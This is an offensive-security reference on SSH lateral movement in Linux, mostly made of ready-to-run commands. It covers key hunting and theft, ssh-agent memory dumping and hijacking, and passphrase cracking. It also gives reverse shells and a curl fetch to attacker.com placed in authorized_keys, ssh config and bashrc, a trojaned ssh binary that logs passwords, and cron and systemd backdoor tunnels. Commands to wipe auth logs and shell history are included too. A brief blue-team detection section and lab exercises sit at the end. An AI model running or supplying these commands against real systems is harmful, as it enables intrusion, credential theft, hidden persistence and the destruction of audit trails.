# Linux SSH Lateral Movement Reference

## ELI5: The Master Locksmith's Workshop

### The SSH Key Kingdom Analogy

Imagine SSH keys are like a master locksmith's workshop:

**Traditional Access:**
```
Person → Types password → Opens door
(User → Enter password → SSH login)
```

**SSH Key System:**
```
Master Key → Opens any lock it was made for → No questions asked
(SSH Private Key → Access any server with public key → Automatic login)
```

**The Key Workshop:**
- **id_rsa** = The master key blank
- **id_rsa.pub** = The lock pattern
- **authorized_keys** = List of approved keys
- **known_hosts** = Memory of visited places
- **ssh-agent** = The key butler who holds your keys

### The SSH Web of Trust

```
Developer's Laptop
    ↓ (has keys to...)
Web Server
    ↓ (has keys to...)
Database Server
    ↓ (has keys to...)
Backup Server
    ↓ (has keys to...)
Admin Server → (keys to everything!)
```

**The Lateral Movement Game:**
1. Compromise one system
2. Steal its SSH keys
3. Use keys to access other systems
4. Repeat until domain domination

### Why SSH Is Everywhere in Linux

```
Windows Admin: "I'll RDP to manage servers"
Linux Admin: "SSH is life, SSH is love"

Result: EVERY Linux system has SSH
        EVERY admin has SSH keys
        EVERY automation uses SSH
        = Attacker's Paradise
```

## SSH Key Discovery and Abuse

### Finding SSH Keys

```bash
# Standard SSH key locations
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "id_ecdsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null

# Find all private keys
find / -name "*.key" -o -name "*.pem" 2>/dev/null

# Search home directories
for user in $(cut -d: -f1 /etc/passwd); do
    ls -la /home/$user/.ssh/ 2>/dev/null
done

# Check root SSH directory
ls -la /root/.ssh/

# Find SSH configs
find / -name "ssh_config" -o -name "sshd_config" 2>/dev/null

# Search for keys in unusual places
find /opt /tmp /var /usr -name "*_rsa" -o -name "*.key" 2>/dev/null

# Check for keys in environment variables
env | grep -i key
set | grep -i ssh

# Search in history files
grep -r "BEGIN RSA PRIVATE KEY" /home/ 2>/dev/null
history | grep -i "ssh\|scp\|rsync"

# Check backup directories
find /backup /var/backup -name "*ssh*" 2>/dev/null
```

### Extracting Keys from Memory

```bash
# Dump SSH agent keys
if [ "$SSH_AUTH_SOCK" ]; then
    # List keys in agent
    ssh-add -l

    # Extract keys using gcore
    SSH_AGENT_PID=$(echo $SSH_AUTH_SOCK | grep -oE '[0-9]+')
    gcore $SSH_AGENT_PID
    strings core.$SSH_AGENT_PID | grep -A 20 "BEGIN RSA PRIVATE KEY"
fi

# Extract from process memory
ps aux | grep ssh
gdb -p <ssh_pid>
# In GDB:
(gdb) info proc mappings
(gdb) dump memory /tmp/ssh.dump 0x<start> 0x<end>
(gdb) quit

strings /tmp/ssh.dump | grep -A 50 "BEGIN"

# Use specialized tools
# SSHKeyExtractor
git clone https://github.com/NetSPI/SSHKeyExtractor
python SSHKeyExtractor.py --pid $(pgrep ssh-agent)
```

### Authorized_Keys Manipulation

```bash
# Add backdoor key to all users
for user_home in /home/*; do
    if [ -d "$user_home/.ssh" ]; then
        echo "ssh-rsa AAAAB3[...]your_public_key_here[...] backdoor@attacker" >> "$user_home/.ssh/authorized_keys"
    else
        mkdir -p "$user_home/.ssh"
        echo "ssh-rsa AAAAB3[...]your_public_key_here[...] backdoor@attacker" > "$user_home/.ssh/authorized_keys"
        chmod 700 "$user_home/.ssh"
        chmod 600 "$user_home/.ssh/authorized_keys"
        chown -R $(basename $user_home):$(basename $user_home) "$user_home/.ssh"
    fi
done

# Add command-restricted backdoor
echo 'command="nc -e /bin/bash attacker.com 4444" ssh-rsa AAAAB3[...]' >> ~/.ssh/authorized_keys

# Add with source IP restriction
echo 'from="10.10.10.10" ssh-rsa AAAAB3[...]' >> ~/.ssh/authorized_keys

# Hide in middle of file (less obvious)
head -n 5 ~/.ssh/authorized_keys > /tmp/auth.tmp
echo "ssh-rsa AAAAB3[...] normal@looking" >> /tmp/auth.tmp
tail -n +6 ~/.ssh/authorized_keys >> /tmp/auth.tmp
mv /tmp/auth.tmp ~/.ssh/authorized_keys
```

### SSH Agent Hijacking

```bash
# Find SSH agents
ps aux | grep ssh-agent
ls -la /tmp/ssh-*

# Hijack existing agent
export SSH_AUTH_SOCK=/tmp/ssh-XXX/agent.PID

# Use hijacked agent
ssh-add -l  # List keys
ssh user@target  # Use keys

# Script to find and hijack all agents
#!/bin/bash
for socket in /tmp/ssh-*/agent.*; do
    export SSH_AUTH_SOCK=$socket
    if ssh-add -l 2>/dev/null; then
        echo "[+] Found working agent: $socket"
        ssh-add -l
        # Try to connect to common targets
        for host in $(grep "Host " ~/.ssh/config | awk '{print $2}'); do
            timeout 2 ssh -o BatchMode=yes -o ConnectTimeout=1 $host "whoami" 2>/dev/null && echo "[+] Access to $host"
        done
    fi
done
```

### SSH Key Cracking

```bash
# Check if key is encrypted
grep "ENCRYPTED" id_rsa

# Crack SSH key passphrase with John
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

# Using hashcat
# First convert to hash
python ssh2hashcat.py id_rsa > id_rsa.hashcat
hashcat -m 22921 id_rsa.hashcat rockyou.txt

# Brute force with custom script
#!/usr/bin/env python3
import paramiko
import sys

key_file = sys.argv[1]
wordlist = sys.argv[2]

with open(wordlist, 'r') as f:
    for password in f:
        password = password.strip()
        try:
            key = paramiko.RSAKey.from_private_key_file(key_file, password=password)
            print(f"[+] Password found: {password}")
            break
        except:
            continue
```

## SSH Tunneling Mastery

### Local Port Forwarding

```bash
# Basic local forward
ssh -L 8080:internal-web:80 user@jump-host
# Access internal-web:80 via localhost:8080

# Multiple local forwards
ssh -L 3306:db-server:3306 \
    -L 8080:web-server:80 \
    -L 6379:redis-server:6379 \
    user@jump-host

# Forward to localhost of jump host
ssh -L 5432:localhost:5432 user@jump-host
# Access jump-host's PostgreSQL

# Forward entire subnet (with SOCKS)
ssh -D 1080 user@jump-host
# Use localhost:1080 as SOCKS proxy

# Background forwarding
ssh -fN -L 8080:internal:80 user@jump-host
# -f: Background after auth
# -N: Don't execute command
```

### Remote Port Forwarding

```bash
# Basic remote forward
ssh -R 8080:localhost:80 user@external-server
# external-server:8080 now forwards to our local:80

# Expose internal service to internet
ssh -R 0.0.0.0:8080:internal-server:22 user@vps
# Anyone can now SSH to internal via vps:8080

# Reverse shell via SSH
ssh -R 4444:localhost:4444 user@attacker-server
nc -lvnp 4444  # On local machine
# Shells from internal network connect through tunnel

# Multiple reverse forwards
ssh -R 3389:windows-box:3389 \
    -R 445:file-server:445 \
    -R 1433:sql-server:1433 \
    user@external-server

# GatewayPorts for external access
# In sshd_config: GatewayPorts yes
ssh -R *:8080:localhost:80 user@server
```

### Dynamic Port Forwarding (SOCKS)

```bash
# Create SOCKS proxy
ssh -D 1080 user@pivot-host

# SOCKS with specific bind address
ssh -D 127.0.0.1:1080 user@pivot-host

# Multiple SOCKS on different ports
ssh -D 1080 user@dmz-host
ssh -D 1081 user@internal-host

# Use with curl
curl --socks5 localhost:1080 http://internal-site

# Use with nmap (through ProxyChains)
proxychains nmap -sT internal-network

# Use with Metasploit
setg Proxies socks5:localhost:1080
```

### Multi-Hop SSH Tunneling

```bash
# Method 1: ProxyJump (SSH 7.3+)
ssh -J user@jump1,user@jump2 user@final-target

# Method 2: ProxyCommand
ssh -o ProxyCommand="ssh user@jump1 -W %h:%p" user@jump2

# Method 3: Tunnel through tunnel
ssh -L 2222:jump2:22 user@jump1
ssh -p 2222 -L 3333:target:22 user@localhost
ssh -p 3333 user@localhost

# Complex multi-hop with tunnels
# Create chain: local -> jump1 -> jump2 -> internal
ssh -L 1111:localhost:2222 user@jump1 -t \
    ssh -L 2222:localhost:3333 user@jump2 -t \
    ssh -L 3333:internal:22 user@jump3

# SSH config for multi-hop
cat >> ~/.ssh/config << EOF
Host jump1
    HostName jump1.example.com
    User jumpuser

Host jump2
    HostName 10.10.10.10
    User admin
    ProxyJump jump1

Host internal
    HostName 192.168.1.100
    User root
    ProxyJump jump2
EOF

# Now simply: ssh internal
```

## SSH Configuration Exploitation

### Mining SSH Config Files

```bash
# User SSH configs
find /home -name "config" -path "*/.ssh/*" 2>/dev/null

# Parse SSH config for hosts
grep -h "Host " /home/*/.ssh/config 2>/dev/null | awk '{print $2}' | sort -u

# Extract connection details
for config in /home/*/.ssh/config; do
    echo "=== $config ==="
    grep -E "Host |HostName|User|Port|IdentityFile|ProxyCommand|ProxyJump" $config
done

# System-wide SSH config
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config

# Extract useful parameters
grep -E "PermitRootLogin|PasswordAuthentication|PubkeyAuthentication|AuthorizedKeysFile" /etc/ssh/sshd_config

# Find non-standard SSH ports
grep -E "^Port" /etc/ssh/sshd_config
```

### Abusing SSH Options

```bash
# ControlMaster abuse - Hijack existing connections
# If ControlMaster is enabled:
ls ~/.ssh/controlmasters/
ls /tmp/ssh-*/

# Use existing control socket
ssh -o ControlPath=/tmp/ssh-XXX/master-user@host:22 user@host

# Force command execution through multiplexed connection
ssh -O command user@host

# SSH config with backdoor
echo "Host *
    PermitLocalCommand yes
    LocalCommand nc -e /bin/bash attacker.com 4444 2>/dev/null &
" >> ~/.ssh/config

# ProxyCommand backdoor
echo "Host internal-server
    ProxyCommand nc -e /bin/bash attacker.com 4444; ssh -W %h:%p gateway
" >> ~/.ssh/config

# Log passwords with SSH (requires root)
# Create wrapper script
cat > /usr/local/bin/ssh-original << 'EOF'
#!/bin/bash
echo "$(date) - $@" >> /tmp/.ssh.log
read -s -p "Password: " pass
echo "Password: $pass" >> /tmp/.ssh.log
echo $pass | /usr/bin/ssh.original "$@"
EOF

mv /usr/bin/ssh /usr/bin/ssh.original
mv /usr/local/bin/ssh-original /usr/bin/ssh
chmod +x /usr/bin/ssh
```

## ProxyChains Configuration

### Basic ProxyChains Setup

```bash
# Install ProxyChains
apt-get install proxychains4  # Debian/Ubuntu
yum install proxychains-ng    # RHEL/CentOS

# Configuration file
vim /etc/proxychains4.conf

# Basic SOCKS5 through SSH
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Multiple proxies (chain)
cat > /etc/proxychains4.conf << EOF
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
http 127.0.0.1 8080
EOF

# Dynamic chain (skip dead proxies)
sed -i 's/strict_chain/dynamic_chain/' /etc/proxychains4.conf

# Random chain (randomly select proxies)
cat > /etc/proxychains4.conf << EOF
random_chain
chain_len = 2

[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
socks5 127.0.0.1 1082
EOF
```

### Using ProxyChains

```bash
# Basic usage
proxychains4 nmap -sT -Pn target.internal

# Quiet mode (less output)
proxychains4 -q wget http://internal-site/file

# With specific config file
proxychains4 -f /tmp/custom.conf curl http://internal-api

# Common tools through ProxyChains
proxychains4 ssh user@internal-server
proxychains4 telnet internal-device
proxychains4 ftp internal-ftp
proxychains4 mysql -h internal-db -u root -p
proxychains4 psql -h internal-postgres -U postgres

# Metasploit through ProxyChains
proxychains4 msfconsole

# Nmap through ProxyChains (TCP only!)
proxychains4 nmap -sT -Pn -p 22,80,443,445,3389 internal-range

# Web tools
proxychains4 firefox
proxychains4 chromium --no-sandbox
proxychains4 curl -k https://internal-site

# Git through proxy
proxychains4 git clone http://internal-gitlab/repo.git

# Python scripts
proxychains4 python3 exploit.py

# Perl scripts
proxychains4 perl scanner.pl
```

### ProxyChains Troubleshooting

```bash
# Debug mode
proxychains4 -v curl http://target

# Check if proxy is working
timeout 5 proxychains4 nc -zv internal-host 22

# DNS issues - Use IP instead of hostname
proxychains4 curl http://10.10.10.10 instead of http://internal.local

# Or enable proxy_dns in config
echo "proxy_dns" >> /etc/proxychains4.conf

# Fix timeout issues
sed -i 's/tcp_read_time_out.*/tcp_read_time_out 30000/' /etc/proxychains4.conf
sed -i 's/tcp_connect_time_out.*/tcp_connect_time_out 20000/' /etc/proxychains4.conf

# Test specific proxy
nc -zv 127.0.0.1 1080  # Test if SOCKS proxy is listening

# Alternative: Use tsocks
apt-get install tsocks
echo "server = 127.0.0.1
server_port = 1080
server_type = 5" > /etc/tsocks.conf

tsocks ssh user@internal-server
```

## Advanced SSH Techniques

### SSH Multiplexing

```bash
# Enable ControlMaster for connection sharing
mkdir -p ~/.ssh/controlmasters

cat >> ~/.ssh/config << EOF
Host *
    ControlMaster auto
    ControlPath ~/.ssh/controlmasters/%r@%h:%p
    ControlPersist 10m
EOF

# First connection establishes master
ssh user@server

# Subsequent connections reuse socket (much faster)
ssh user@server  # Instant connection

# Control commands
ssh -O check user@server     # Check master status
ssh -O forward -L 8080:localhost:80 user@server  # Add forwarding
ssh -O cancel -L 8080:localhost:80 user@server   # Cancel forwarding
ssh -O stop user@server       # Stop master
ssh -O exit user@server       # Stop master immediately
```

### SSH Escape Sequences

```bash
# During SSH session, type:
~?  # Show help
~.  # Disconnect
~^Z # Suspend session
~C  # Open command line
~#  # List forwarded connections
~&  # Background session
~R  # Request rekey

# Add port forwarding on the fly
~C
-L 8080:internal-host:80
<enter>

# Add reverse forward on the fly
~C
-R 4444:localhost:4444
<enter>

# Cancel forwarding
~C
-KL 8080
<enter>
```

### SSH over Non-Standard Channels

```bash
# SSH over HTTP with corkscrew
apt-get install corkscrew

# Configure ProxyCommand
echo "Host target
    ProxyCommand corkscrew proxy.corp.com 8080 %h %p
" >> ~/.ssh/config

# SSH over DNS with iodine
# Server side
iodined -f -c -P password 10.0.0.1 dns.mydomain.com

# Client side
iodine -f -P password dns.mydomain.com
ssh root@10.0.0.1

# SSH over ICMP with ptunnel
# Server side
ptunnel-ng -r

# Client side
ptunnel-ng -p proxy-server -l 2222 -r target-server -R 22
ssh -p 2222 localhost

# SSH over WebSocket
# Using websocat
# Server: websocat -s 0.0.0.0:8080 tcp:127.0.0.1:22
# Client: websocat ws://server:8080 tcp-l:127.0.0.1:2222
ssh -p 2222 localhost
```

## Persistence Techniques

### SSH-Based Persistence

```bash
# Method 1: Cron-based SSH reverse tunnel
(crontab -l 2>/dev/null; echo "*/5 * * * * ssh -R 4444:localhost:22 -o StrictHostKeyChecking=no attacker@external 2>&1 >/dev/null") | crontab -

# Method 2: SystemD service
cat > /etc/systemd/system/tunnel.service << EOF
[Unit]
Description=Tunnel Service
After=network.target

[Service]
Type=simple
User=nobody
ExecStart=/usr/bin/ssh -N -R 4444:localhost:22 attacker@external
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl enable tunnel.service
systemctl start tunnel.service

# Method 3: RC.local
echo "nohup ssh -N -R 4444:localhost:22 attacker@external &" >> /etc/rc.local

# Method 4: Bashrc backdoor
echo 'alias ssh="/usr/bin/ssh -o LocalCommand=\"nc -e /bin/bash attacker.com 4444 2>/dev/null &\" -o PermitLocalCommand=yes"' >> ~/.bashrc

# Method 5: SSH AuthorizedKeysCommand
# In sshd_config:
echo "AuthorizedKeysCommand /usr/local/bin/get_keys.sh
AuthorizedKeysCommandUser nobody" >> /etc/ssh/sshd_config

# Create script
cat > /usr/local/bin/get_keys.sh << 'EOF'
#!/bin/bash
curl -s http://attacker.com/keys.txt
cat /home/*/.ssh/authorized_keys 2>/dev/null
EOF
chmod +x /usr/local/bin/get_keys.sh
```

## Detection and OPSEC

### Hiding SSH Activity

```bash
# Clear SSH logs
> /var/log/auth.log
> /var/log/secure
> /var/log/wtmp
> /var/log/btmp
> /home/*/.bash_history

# Disable history for session
unset HISTFILE
export HISTSIZE=0
kill -9 $$  # Kill shell without saving history

# Hide from netstat/ss
# Use existing SSH connection (ControlMaster)

# Spoof SSH version string
echo "SSH-2.0-OpenSSH_7.4" | nc target 22

# Use non-standard ports
ssh -p 443 user@server  # HTTPS port
ssh -p 53 user@server   # DNS port

# Obfuscate known_hosts
ssh -o HashKnownHosts=yes user@server

# Tunnel SSH through SSL
stunnel4 stunnel.conf
# stunnel.conf:
# [ssh]
# accept = 443
# connect = 127.0.0.1:22
```

### Blue Team Detection Points

```bash
# Monitor for unusual SSH connections
netstat -tnpa | grep :22
ss -tnpa | grep :22

# Check for suspicious authorized_keys entries
find / -name authorized_keys -exec grep -l "command=" {} \;

# Monitor SSH agent sockets
lsof /tmp/ssh-*

# Check for SSH tunnels
ps aux | grep -E "ssh.*-[LRD]"

# Audit SSH config changes
auditctl -w /etc/ssh/sshd_config -p wa
auditctl -w /home -p wa -k ssh_keys

# Check for SSH multiplexing
find / -path "*/\.ssh/controlmasters/*" 2>/dev/null

# Monitor failed SSH attempts
grep "Failed password" /var/log/auth.log
grep "Accepted publickey" /var/log/auth.log

# Check systemd services for tunnels
systemctl list-units | grep -E "tunnel|ssh"
```

## Quick Reference

```bash
# Find keys
find / -name id_rsa 2>/dev/null

# SSH tunnels
ssh -L 8080:target:80 user@jump     # Local
ssh -R 8080:target:80 user@external # Remote
ssh -D 1080 user@jump               # SOCKS

# ProxyChains
proxychains4 nmap -sT target

# Multi-hop
ssh -J jump1,jump2 final-target

# ControlMaster
ssh -O check user@host

# Key operations
ssh-keygen -t rsa -b 4096
ssh-copy-id user@host
ssh-add ~/.ssh/id_rsa
```

## Conclusion

SSH lateral movement is the bread and butter of Linux post-exploitation. Every connection creates a new path, every key opens new doors. Key principles:

1. **SSH keys are everywhere** - Look in obvious and non-obvious places
2. **Trust relationships are gold** - One key often leads to many systems
3. **Tunneling is powerful** - Turn one access into network-wide access
4. **Persistence is easy** - SSH provides numerous backdoor opportunities
5. **Detection is hard** - SSH traffic looks legitimate

Remember: In Linux environments, SSH is both the primary administration tool and the primary lateral movement vector.

## Lab Exercises

1. **Key Hunt**: Find and use 5 different SSH keys on a system
2. **Tunnel Master**: Create local, remote, and dynamic tunnels
3. **Multi-Hop Challenge**: Pivot through 3+ systems using SSH
4. **Persistence Challenge**: Establish 3 different SSH backdoors
5. **ProxyChains Master**: Access internal network using only ProxyChains